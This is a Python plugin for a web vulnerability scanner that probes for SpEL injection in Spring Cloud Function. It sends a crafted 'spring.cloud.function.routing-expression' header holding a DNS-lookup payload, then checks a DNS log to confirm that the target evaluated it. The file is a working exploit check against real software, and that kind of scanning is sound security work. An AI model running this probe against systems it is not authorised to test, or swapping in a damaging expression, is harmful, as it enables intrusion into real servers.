#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# @author: orleven

import asyncio
from script import BaseScript
from lib.core.enums import ServicePortMap
from lib.util.aiohttputil import ClientSession

class Script(BaseScript):
    """
    java spel inject
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB
        self.spel_payload = 'T(java.net.InetAddress).getByName("{dnslog}")'

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for url in self.get_url_normpath_list(self.url):
                    dns = self.get_dnslog()
                    payload = f'T(java.net.InetAddress).getByName("{dns}")'
                    headers = {
                        "spring.cloud.function.routing-expression": payload
                    }
                    try:
                        async with session.post(url=url, headers=headers, allow_redirects=False) as res:
                            await asyncio.sleep(3)
                            if await self.get_dnslog_recode(dns):
                                yield url
                    except:
                        pass